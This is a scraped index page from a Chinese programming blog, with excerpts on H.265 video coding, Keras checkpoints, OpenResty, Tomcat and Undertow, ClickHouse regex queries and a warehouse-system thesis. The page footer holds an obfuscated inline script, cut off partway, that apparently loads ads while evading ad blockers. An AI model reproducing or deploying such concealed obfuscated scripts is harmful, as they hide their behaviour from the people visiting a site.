一.H265/HEVC 1.介绍 H.265又称为HEVC（全称High Efficiency Video Coding，高效率视频编码，本文统称为H.265），是ITU-T H.264/MPEG-4 AVC标准的继任者。2004年开始由ISO/IEC Moving Picture Experts Group（MPEG）和ITU-T Video Coding Experts Group（VCEG）作为ISO/IEC 23008-2 MPEG-H Part 2或称作ITU-T H.265开始制定。第一版的HEVC/H.265视频压缩标准在2013年4月13日被接受为国际电信联盟（ITU-T）的正式标准。
2.制定 2012年8月，爱立信公司推出了首款H.265编解码器，而在仅仅六个月之后，国际电联（ITU）就正式批准通过了HEVC/H.265标准，标准全称为高效视频编码（High Efficiency Video Coding），相较于之前的H.264标准有了相当大的改善。
H.265旨在在有限带宽下传输更高质量的网络视频，仅需原先的一半带宽即可播放相同质量的视频。这也意味着，我们的智能手机、平板机等移动设备将能够直接在线播放1080p的全高清视频。H.265标准也同时支持4K（4096×2160）和8K（8192×4320）超高清视频。可以说，H.265标准让网络视频跟上了显示屏“高分辨率化”的脚步。
可能在几个月内，你就能看到支持H.265解码的设备上市了（如智能手机、显卡等）。H.264统治了过去的五年，而未来的五年甚至十年，H.265很可能将会成为主流。
3.传输码率 H.263可以2~4Mbps的传输速度实现标准清晰度广播级数字电视（符合CCIR601、CCIR656标准要求的720*576）；而H.264由于算法优化，可以低于2Mbps的速度实现标清数字图像传送；H.265 High Profile可实现低于1.5Mbps的传输带宽下，实现1080p全高清视频传输。
除了在编解码效率上的提升外，在对网络的适应性方面H.265也有显著提升，可很好运行在Internet等复杂网络条件下。
4.优势 H.265/HEVC的编码架构大致上和H.264/AVC的架构相似，主要也包含，帧内预测（intra prediction）、帧间预测（inter prediction）、转换（transform）、量化（quantization）、去区块滤波器（deblocking filter）、熵编码（entropy coding）等模块，但在HEVC编码架构中，整体被分为了三个基本单位，分别是：
编码单位（coding unit, CU）预测单位（predict unit, PU）转换单位（transform unit, TU） 比起H.264/AVC，H.265/HEVC提供了更多不同的工具来降低码率，以编码单位来说，H.264中每个宏块（macroblock/MB）大小都是固定的16x16像素，而H.265的编码单位可以选择从最小的8x8到最大的64x64。
以该图为例，信息量不多的区域（颜色变化不明显，比如车体的红色部分和地面的灰色部分）划分的宏块较大，编码后的码字较少，而细节多的地方（轮胎）划分的宏块就相应的小和多一些，编码后的码字较多，这样就相当于对图像进行了有重点的编码，从而降低了整体的码率，编码效率就相应提高了。
同时，H.265的帧内预测模式支持33种方向（H.264只支持8种），并且提供了更好的运动补偿处理和矢量预测方法。
反复的质量比较测试已经表明，在相同的图象质量下，相比于H.264，通过H.265编码的视频大小将减少大约39-44%。由于质量控制的测定方法不同，这个数据也会有相应的变化。
通过主观视觉测试得出的数据显示，在码率减少51-74%的情况下，H.265编码视频的质量还能与H.264编码视频近似甚至更好，其本质上说是比预期的信噪比（PSNR）要好。
这些主观视觉测试的评判标准覆盖了许多学科，包括心理学和人眼视觉特性等，视频样本非常广泛，虽然它们不能作为最终结论，但这也是非常鼓舞人心的结果。
H.264与H.265编码视频的主观视觉测试对比，我们可以看到后者的码率比前者大大减少了。
截止2013年的HEVC标准共有三种模式：Main、Main 10、Main Still Picture。Main模式支持8bit色深（即红绿蓝三色各有256个色度，共1670万色），Main 10模式支持10bit色深，将会用于超高清电视（UHDTV）上。前两者都将色度采样格式限制为4:2:0。预期将在2014年对标准有所扩展，将会支持4:2:2和4:4:4采样格式（即提供了更高的色彩还原度），和多视图编码（例如3D立体视频编码）。
事实上，H.265和H.264标准在各种功能上有一些重叠。例如，H.264标准中的Hi10P部分就支持10bit色深的视频；另一个H.264的部分（Hi444PP）还可以支持4:4:4色度抽样和14bit色深。在这种情况下，H.265和H.264的区别就体现在前者可以使用更少的带宽来提供同样的功能，其代价就是设备计算能力：H.265编码的视频需要更多的计算能力来解码。
已经有支持H.265解码的芯片发布了——博通公司在2013年1月初的CES大展上发布了一款Brahma BCM7445芯片，它是一个采用28纳米工艺的四核处理器，可以同时转码四个1080P视频数据流，或解析分辨率为4096×2160的H.265编码超高清视频。
截止2013年，有线电视和数字电视广播主要采用仍旧是MPEG-2标准。好消息是，H.265标准的出台最终可以说服广播电视公司放弃垂垂老矣的MPEG-2，因为同样的内容，H.265可以减少70-80%的带宽消耗。这就可以在现有带宽条件下轻松支持全高清1080p广播。但是另一方面，电视广播公司又很少有想要创新的理由，因为大多数有线电视公司在他们的目标市场中面临的竞争实在是有限。出于节省带宽的目的，反而是卫星电视公司可能将会率先采用H.265标准。
长远角度看，H.265标准将会成为超高清电视（UHDTV）的4K和8K分辨率的选择，但这也会带来其它问题，比如2013年还极少有原生4K分辨率的视频内容。H.265标准的完成意味着内容拥有者在2013年已经有了一个对应的理论标准，但是他们在2013年还没有一个统一的方式来传送内容。
标清（SD）、高清（HD）和4K分辨率超高清（UHD）视频大小对比图
蓝光光盘协会（The Blu-ray Disc Association）正在研究在蓝光光盘标准中支持4K分辨率视频的方法，但是这可没那么简单。理论上H.264在扩展后就可以拥有这个功能，但是到那时码率问题又会浮出水面。一个H.264编码的4K蓝光电影需要的存储空间远大于相同内容的H.265版本，其大小可高达100G以上，而现有的播放器也不支持100-128GB的高容量可刻录可擦写光盘（BDXL）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e6166048fa76e4a038134d41f4ba5d45/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25333aced7a54cfc2000bd0a4bc7bf6b/" rel="bookmark">
			Keras函数——keras.callbacks.ModelCheckpoint()及模型的训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 keras.callbacks.ModelCheckpoint(filepath, monitor='val_loss', verbose=0, save_best_only=False, save_weights_only=False, mode='auto', period=1) 在每个epoch后保存模型到filepath。
参数：
filepath: 保存模型的路径。　monitor: 被监测的数据。val_acc或val_loss。　verbose: 详细信息模式，0 或者1。0为不打印输出信息，1为打印。　save_best_only: 如果save_best_only=True，将只保存在验证集上性能最好的模型mode: {auto, min, max} 的其中之一。 如果save_best_only=True，那么是否覆盖保存文件的决定就取决于被监测数据的最大或者最小值。 对于val_acc，模式就会是max；而对于 val_loss，模式就需要是min。在auto模式中，方式会自动从被监测的数据的名字中判断出来。　save_weights_only: 如果 True，那么只有模型的权重会被保存 (model.save_weights(filepath))， 否则的话，整个模型会被保存 (model.save(filepath))。　period: 每个检查点之间的间隔（训练轮数）。 训练过程：
1、从keras.callbacks导入ModelCheckpoint类
from keras.callbacks import ModelCheckpoint 2、在训练阶段的model.compile之后加入下列代码实现每一次epoch（period=1）保存最好的参数
checkpoint = keras.callbacks.ModelCheckpoint(filepath, monitor='val_loss', save_weights_only=True,verbose=1,save_best_only=True, period=1) 3、在训练阶段的model.fit之前加载先前保存的参数
if os.path.exists(filepath): model.load_weights(filepath) # 若成功加载前面保存的参数，输出下列信息 print("checkpoint_loaded") 4、在model.fit添加callbacks=[checkpoint]实现回调
model.fit_generator(data_generator_wrap(lines[:num_train], batch_size, input_shape, anchors, num_classes), steps_per_epoch=max(1, num_train//batch_size), validation_data=data_generator_wrap(lines[num_train:], batch_size, input_shape, anchors, num_classes), validation_steps=max(1, num_val//batch_size), epochs=, initial_epoch=0, callbacks=[checkpoint]) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cca51611c335270249929a507ae3fc2d/" rel="bookmark">
			nginx&#43;lua(openresty) 安装及使用（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
OpenResty —— 通过 Lua 扩展 NGINX 实现的可伸缩的 Web 平台。
OpenResty（也称为 ngx_openresty）是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。
OpenResty 通过汇聚各种设计精良的 Nginx 模块（主要由 OpenResty 团队自主开发，），从而将 Nginx 有效地变成一个强大的通用 Web 应用平台。这样，Web 开发人员和系统工程师可以使用 Lua 脚本语言调动 Nginx 支持的各种 C 以及 Lua 模块，快速构造出足以胜任 10K 乃至 1000K 以上单机并发连接的高性能 Web 应用系统。
1:准备
下载地址: http://openresty.org/cn/download.html ( 这里下载是win64版最新版)
2：配置
openresty-1.21.4.1-win64\conf\nginx.conf 拷贝个 改名 nginx_debug.conf 这样方便测试
worker_processes 1; error_log logs/error.log; events { worker_connections 1024; } http { lua_package_path "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cca51611c335270249929a507ae3fc2d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bd91b51da00e5f8fc2d911af0774bec/" rel="bookmark">
			Pycharm插件之Statistic（统计代码行数、字数等数据）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Pycharm插件之*Statistic(统计代码行数、字数等数据)* 【一】引言 PyCharm 插件 “Statistic” 可以帮助我们统计代码行数、字数、注释数、空行数等代码质量相关的数据，用来评估代码的质量和工作量的大小。
以下是详细步骤：
1.打开 PyCharm，进入 Settings(设置)。
2.选择 Plugins(插件)，搜索 “Statistic” 并安装。
3.安装成功后，在 PyCharm 主窗口中，选择 Tools(工具)菜单，点击 "Statistic"。
4.在 “Statistic” 窗口中，可以选择要统计的文件路径、文件类型、排除路径等选项，然后点击 “Start” 开始统计。
5.统计完成后，在 “Statistic” 窗口中可以看到统计结果，包括代码行数、注释行数、空行数、代码字数等数据。
通过这些数据，可以进行代码质量评估和工作量估算，发现代码中的问题，并标记需要改进的代码区域。
同时，还可以利用这些数据对自己的编码效率和代码规范进行评估，从而提高编码水平。
需要注意的是，虽然 “Statistic” 插件可以帮助我们统计代码质量相关数据，但这些数据只能作为一种参考，不一定能准确反映出代码的质量，更不能作为评估工作量的唯一标准。
正确评估代码质量和工作量需要综合考虑多个因素，包括代码的复杂度、可读性、可维护性等等。
【二】安装 1.打开 PyCharm，进入 Settings(设置)。 2.选择 Plugins(插件)，搜索 “Statistic” 并安装。 3.安装成功后，在 PyCharm 主窗口中，选择 Tools(工具)菜单，点击 "Statistic"。 4.在 “Statistic” 窗口中，可以选择要统计的文件路径、文件类型、排除路径等选项，然后点击 “Start” 开始统计。 5.统计完成后，在 “Statistic” 窗口中可以看到统计结果，包括代码行数、注释行数、空行数、代码字数等数据。 【三】注解 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6eebf9fecf527edceb1c36d475c7e7e/" rel="bookmark">
			SOLIDWORKS PDM Professional中的Add-ins
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现COM接口IEdmAddIn5的DLLs:IEdmAddIn5 Interface - 2019 - SOLIDWORKS API Help。通过“Add-in特性”对话框添加到文件库中：Administrate Add-ins Dialog Box - 2019 - SOLIDWORKS API Help通知SOLIDWORKS PDM Professional 用户操作： 将Add-in添加到文件库时，将调用IEdmAddIn5::GetAddInInfo。
当用户执行Add-in想要被通知的动作时，例如，当选择菜单项、创建文件或检入或检出文件时。SOLIDWORKS PDM Professional 调用 IEdmAddIn5::OnCmd 。
SOLIDWORKS PDM Professional 中使用 hooks (EdmCmdType)编程。所有的hooks都是通过IEdmAddIn5接口处理的。 以下示例显示如何创建基本的Add-in程序：
VB.NETVisual C#Visual C++ 在你使用范例创建基本的Add-in程序后，参考如何添加hooks:
在文件资源管理器中添加菜单项和工具栏按钮，使用：
VB.NETVisual C#Visual C++ 文件检入检出时添加hooks ：
VB.NETVisual C#Visual C++ 使用 VB.NET Hook up 文件数据卡中的按钮
使用VB.NET 通过Add-in 创建序列号
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/190323a7094e661c354d94d0f8db696a/" rel="bookmark">
			tomcat和undertow、jetty、netty的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录一下，最近发现的几个容器的区别
tomcat简介 Tomcat：免费开源，轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。实际上Tomcat 部分是Apache 服务器的扩展，但它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。只实现了JSP/Servlet的相关规范，不支持EJB。虽说是tomcat服务器，但是并不是真正的硬件，它是部署在电脑上的软件服务。
tomcat的作用
上面说过Tomcat是一个容器，但为什么开发出来的应用需要装进Tomcat这个容器呢。忽略各个文件之间的跳转，web应用本质只是一个装有很多资源(java/html/jsp/js/css等各种格式文件)的文件夹。假如我们有一个web应用projectA，我们在某台计算机A把这些文件写好后，就希望其他设备能够通过一些方式来访问我们的资源。一种方法是通过在浏览器地址栏输入URL来实现资源的访问。
那么从我们在计算机A上写好某个文件夹到文件夹能够被其他计算机所访问，需要什么呢。首先需要我们的互联网。计算机B先通过互联网找到计算机A。
而这样做的前提是你这个电脑必须在互联网这个网络里面，这样别人才能访问到你。也就是说一台电脑必须要有IP地址才能称为服务器。但这样也只是找到了IP地址而已，我们还需要找到对应的主机（注：一般主机是指一台电脑，但在tomcat中，虚拟主机指的是计算机中的某个文件夹）。但就算找到了计算机A，我们怎么知道要去哪里寻找web应用projectA呢。Tomcat容器就是来解决这个问题的。在我看来，Tomcat的一个重要的功能就在于“映射”（通过配置文件实现）。
javaweb项目都需要tomcat？
其实可以不要，之前Javaweb项目多为jsp，而jsp需要jsp容器来解释，所以需要tomcat等含有jsp容器的web服务器。使用jsp的时候，jsp没有main方法，怎么把服务启动呢，这个时候tomcat容器就很有必要了。
但随着近些年了，前后端分离导致不需要jsp容器来解释jsp，于是tomcat在项目中完全可以不要的，可以使用JBoss、Jetty等单纯Web应用服务器。
但tomcat也可以做Web服务器，所以项目中还是可以继续使用tomcat。
Java前后端分离的核心思想
前端html页面通过ajax调用后端的restuful api接口并使用json数据进行交互。前后端分离的项目就可以不使用tomcat容器。
springboot内置的tomcat
不得不说SpringBoot的开发者是在为大众程序猿谋福利，把大家都惯成了懒汉，xml不配置了，连tomcat也懒的配置了，典型的一键启动系统，那么tomcat在springboot是怎么启动的呢？
@SpringBootApplication
public class SpringbootH2Application {
public static void main(String[] args) {
SpringApplication.run(SpringbootH2Application.class, args);
}
}
有的公司在生产环境不使用springboot自带的tomcat，则需要在代码中排出：
undertow和tomcat的区别
在 SpringBoot 框架中，使用最多的是 Tomcat，这是 SpringBoot 默认的容器技术，而且是内嵌式的 Tomcat。
同时，SpringBoot 也支持 Undertow 容器，我们可以很方便的用 Undertow 替换 Tomcat，而 Undertow 的性能和内存使用方面都优于 Tomcat。
在高并发系统中，Tomcat 相对来说比较弱。在相同的机器配置下，模拟相等的请求数，Undertow 在性能和内存使用方面都是最优的。并且 Undertow 新版本默认使用持久连接，这将会进一步提高它的并发吞吐能力。所以，如果是高并发的业务系统，Undertow 是最佳选择。
使用：
1.排除SpingBoot中自带的tomcat
如上图2
2.添加Undertow的依赖
这样即可，使用默认参数启动undertow服务器。如果需要修改undertow参数，继续往下看。
undertow的参数设置：
server:
port: 8084
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/190323a7094e661c354d94d0f8db696a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df179b73ddf8e73f4b0bc7601e8a2949/" rel="bookmark">
			【巧用clickhouse 正则进行关键字提取 楼栋\单元\房屋】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 利用ClickHouse 快速提取楼栋\单元\房屋信息 下面几个地址： 兴学街东社区测试小区1号楼1单元101室 兴东社区1-1-101 兴学测试1#1 101 如何快速匹配呢 可以通过先拆分字符串数组，然后取交集的方式实现:
一个sql 快速搞定：
SELECT extractAll('兴学街东社区测试小区1号楼1单元101室', '\\d+') AS residential_arr, '兴学街东社区测试小区1号楼1单元101室' AS residential_address, length(arrayIntersect(extractAll('兴学街东社区测试小区1号楼1单元101室', '[\\x{4e00}-\\x{9fa5}]'), extractAll('兴东社测试', '[\\x{4e00}-\\x{9fa5}]'))) AS interset ┌─residential_arr─┬─residential_address─────────────────┬─interset─┐ │ ['1','1','101'] │ 兴学街东社区测试小区1号楼1单元101室 │ 5 │ └─────────────────┴─────────────────────────────────────┴──────────┘ SELECT residential_address, extractAll(residential_address, '.*龙凤苑\\D*12甲\\D*1\\D*101') AS address_list FROM yisa_personnel.personnel_info_all WHERE (extractAll(residential_address, '.*龙凤苑\\D*12甲\\D*1\\D*101')[1]) != '' ┌─residential_address──────────────────────┬─address_list───────────────────────────────┐ │ 龙凤苑社区西八路龙凤苑12甲号楼1单元101号 │ ['龙凤苑社区西八路龙凤苑12甲号楼1单元101'] │ └──────────────────────────────────────────┴────────────────────────────────────────────┘ ┌─residential_address─┬─address_list───────────┐ │ 龙凤苑A区12甲1-101 │ ['龙凤苑A区12甲1-101'] │ └─────────────────────┴────────────────────────┘ ┌─residential_address─────────────────────────────────────────────────┬─address_list──────────────────────────────────────────────────────────┐ │ 山东省淄博市张店区马尚街道龙凤苑社区龙凤苑A区12甲号楼号楼1单元101号 │ ['山东省淄博市张店区马尚街道龙凤苑社区龙凤苑A区12甲号楼号楼1单元101'] │ └─────────────────────────────────────────────────────────────────────┴───────────────────────────────────────────────────────────────────────┘ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0db1d7feb8fd46d19e95db3d0cadef30/" rel="bookmark">
			基于SSM的物流仓库管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘 要
随着社会的发展，社会的方方面面都在利用信息化时代的优势。互联网的优势和普及使得各种系统的开发成为必需。
本文以实际运用为开发背景，运用软件工程原理和开发方法，它主要是采用java语言技术和mysql数据库来完成对系统的设计。整个开发过程首先对仓库管理系统进行需求分析，得出仓库管理系统主要功能。接着对仓库系统进行总体设计和详细设计。总体设计主要包括仓库管理系统的功能设计、总体结构设计、数据结构设计和安全设计等；详细设计主要包括仓库系统数据库访问的实现，主要功能模块的具体实现，模块实现关键代码等。最后对仓库管理系统进行了功能测试，并对测试结果进行了分析总结，得出仓库管理系统存在的不足及需要改进的地方，为以后的仓库管理系统维护提供了方便，同时也为今后开发类似仓库管理系统提供了借鉴和帮助。
仓库管理系统开发使系统能够更加方便快捷，同时也促使仓库管理系统变的更加系统化、有序化。系统界面较友好，易于操作。
关键词：仓库管理系统；java语；Mysql；数据库；SSM框架
1 系统概述 1.1 概述 随着信息时代的快速发展，互联网的优势和普及，人们生活水平的不断提高，工作时间的繁忙，使得仓库管理系统的开发成为必需。仓库管理系统主要是借助计算机，通过对仓库管理系统管理所需的信息管理，增加用户的选择，同时也方便广大用户信息的及时查询、修改以及对仓库管理系统信息的及时了解。仓库管理系统给用户带来了更多的选择, 该系统通过和数据库软件协作来满足用户的需求。
1.2课题意义 如今，随着移动用户端的普及，微信因为其简单，方便，并且用户体验度好，所以被称为现在聊天沟通的新宠，同时也被应用到更多的企业做宣传推广。截至2017年底，微信用户数突破10亿，包括银行、证券、快递服务、电子商务等越来越多的公司在微信平台上推出相应的服务平台，以适应用户新的行为习惯。微信平台的科研社交网络平台已是势在必行。计算机技术在现代管理中的应用，使计算机成为人们应用现代技术的重要工具。能够有效的解决用户管理便捷化的问题，提高效率。给用户提供最全面、最专业的数据管理信息，帮助他们了解最新详细信息，还有就是借助微信端，能够更好的满足用户的需求，为用户节省时间以达到省时又高效的目的。
1.3 主要内容 仓库管理系统从功能、数据流程、可行性、运行环境进行需求分析。对仓库管理系统的数据库、功能进行了详细设计，分析了主要界面设计和相关组件设计，仓库管理系统的具体实现进行了介绍。从数据库中获取数据、向数据库中写入数据，实现系统直接对数据库进行各种数据库查询、插入、删除、更新等操作，在网页中加入动态内容，从而实现仓库管理系统所需要的各种基本功能。
2 系统开发环境 2.1微信开发者工具 微信开发者工具现在已经被小程序开发团队开发运行，目前微信开发者工具任然在不断的完善中，在开发小程序时经常要不断的更新。可以使用微信扫码登陆开发者工具，开发者工具将使用这个微信帐号的信息进行小程序的开发和调试。
机型选择：小程序以智能手机的屏幕尺寸为设计标准，进行切图。
预览界面：写好视图布局后点击编译，用来刷新视图界面。
控制台：方便调试打印输出信息。
上传代码：上传到腾讯服务器，提交审核必经步骤。上传代码时可以填写版本号和备注信息。
资源文件：一般可以在资源文件进行对应项目的文件目录的断点调试。
显示远程调试：手机端和PC端开发工具联调对用户而言是非常实用的。
本地数据存储：显示的是本地存储的数据。
视图调试：标组件以子父层级结构呈现，方便调试。
微信限制在2M 以内的代码体积；开发中一般不校验合法域名信息；小程序后台要做配置服务器域名。
以上就是在开发过程中微信开发者工具常用到的功能，微信开发者工具也在不断的完善。
2.2小程序框架以及目录结构介绍 整个小程序框架系统分为两部分：逻辑层和视图层。小程序开发框架的目标是通过尽可能简单、高效的方式让开发者可以在微信中开发具有原生小程序体验的服务。小程序在视图层与逻辑层间提供了数据传输和事件系统，提供了自己的视图层以及逻辑层框架，让开发者能够专注于数据与逻辑。框架的核心是一个响应的数据绑定系统，可以让数据与视图非常简单地保持同步。在逻辑层做数据修改，在视图层就会做相应的更新。框架提供了一套基础的组件，这些组件自带微信风格的样式以及特殊的逻辑，开发者可以通过组合基础组件，创建出强大的小程序。
2.3 JAVA简介 Java主要采用CORBA技术和安全模型，可以在互联网应用的数据保护。它还提供了对EJB（Enterprise JavaBeans）的全面支持，java servlet API，JSP（java server pages），和XML技术。多进步。例如，当我在微软Word中写这篇文章时，我还打开了一个MP3播放器来播放音乐。偶尔，我也会编辑Word，让商品出库管理机器执行打印作业，我也喜欢通过IE。对我来说，这些操作是同时执行的，我不需要等待一首歌来完成商品出库管理论文编辑。似乎他们都在商品出库管理机器上同时为我工作。事实是，对于一个CPU，它只能在某个时间点执行一个程序。CPU在这些程序之间不断地“跳跃”。那么为什么我们看不到任何破坏呢？这是因为，与我们的感情相比，它的速度太快了。因此，尽管我们看到一些同步操作，实际上对于计算机来说，它只能在某个时间点执行一个程序，除非您的计算机是多CPU的。
Java是一种计算机编程语言，具有封装、继承和多态性三个主要特性，广泛应用于企业Web应用程序开发和移动应用程序开发。
Java语言和一般编译器以及直译的区别在于，Java首先将源代码转换为字节码，然后将其转换为JVM的可执行文件，JVM可以在各种不同的JVM上运行。因此，实现了它的跨平台特性。虽然这使得Java在早期非常缓慢，但是随着Java的开发，它已经得到了明显改进。
2.4 MySQL数据库 Mysql的语言是非结构化的，用户可以在数据上进行工作。MySQL因为其速度、可靠性和适应性而备受关注。大多数人都认为在不需要事务化处理的情况下，MySQL是管理内容最好的选择。并且因为Mysql的语言和结构比较简单，但是功能和存储信息量很强大，所以得到了普遍的应用。
Mysql数据库在编程过程中的作用是很广泛的，为用户进行数据查询带来了方便。Mysql数据库的应用因其灵活性强，功能强大，所以在实现某功能时只需要一小段代码，而不像其他程序需要编写大段代码。总体来说，Mysql数据库的语言相对要简洁很多。
数据流程分析主要就是数据存储的储藏室，它是在计算机上进行的，而不是现实中的储藏室。数据的存放是按固定格式，而不是无序的，其定义就是：长期有固定格式，可以共享的存储在计算机存储器上。数据库管理主要是数据存储、修改和增加以及数据表的建立。为了保证系统数据的正常运行，一些有能力的处理者可以进行管理而不需要专业的人来处理。数据表的建立，可以对数据表中的数据进行调整，数据的重新组合及重新构造，保证数据的安全性。介于数据库的功能强大等特点，本系统的开发主要应用了Mysql进行对数据的管理。
2.5 SSM三大框架 （1）Spring的优势:
通过Spring的IOC特性，将对象之间的依赖关系交给了Spring控制，方便解耦，简化了开发。
（2）Spring MVC的优势:
SpringMVC是使用了MVC设计思想的轻量级web框架，对web层进行解耦，使我们的开发更简洁。
（3）Mybatis的优势:
数据库的操作(sql)采用xml文件配置，解除了sql和代码的耦合，提供映射标签，支持对象和和数据库orm字段关系的映射，支持对象关系映射标签，支持对象关系的组建提供了xml标签，支持动态的sql。
3 需求分析 3.1 系统设计目标 当今社会的生活节奏越来越快，人们对手机微信的需求也越来越高，不仅对操作简单、功能齐全方面，而且对于用户的体验度也有了更高的要求，最快捷高效的方式莫过于利用互联网，将仓库管理系统和互联网结合起来，为用户提供方便快捷的服务。
需求分析的任务是通过详细调查现实要处理的对象，充分了解系统的工作概况，明确用户的各种需求，然后在此基础上确定新系统的功能。新系统必须充分考虑今后可能的扩充和改变。
3.2需求分析概述 仓库管理系统主要是为了提高用户的工作效率和更方便快捷的满足用户，更好存储所有数据信息及快速方便的检索功能，对仓库管理系统的各个模块是通过许多今天的发达仓库管理系统做出合理的分析来确定考虑用户的可操作性，遵循开发的系统优化的原则，经过全面的调查和研究。
仓库管理系统所要实现的功能分析，对于现在网络方便，仓库管理系统要实现管理员、用户可以直接在平台上进行查看自己所需数据信息，这样既能节省管理的时间，不用再像传统的方式，如果用户想要进行交流信息，必须双方见面进行沟通交流所需的信息，由于很多用户时间的原因，没有办法进行见面沟通交流，真的很难满足用户的各种需求。所以仓库管理系统的开发不仅仅是能满足用户的需求，还能提高用户的使用率。所以系统管理必须要更快捷、有效、长期地为用户或潜在用户传递信息。建立一个仓库管理系统更好的交流平台，提高系统对用户交流后的信息服务的效率。此系统可以满足大多数用户所提出的问题，用户可以根据自身的需求获取相应的服务，为系统管理提供了快捷的途径。
仓库管理系统用户端要求在系统的安卓手机上可以运行，主要实现了管理端；首页、个人中心、用户管理、商品信息管理、商品类型管理、商品出库管理、商品入库管理、仓库位置管理、供应商管理、流水统计管理、系统管理，用户端；首页、商品信息、仓库位置、供应商、我的等主要功能模块的操作和管理。
总体分布如图3.1所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0db1d7feb8fd46d19e95db3d0cadef30/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/72/">«</a>
	<span class="pagination__item pagination__item--current">73/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/74/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 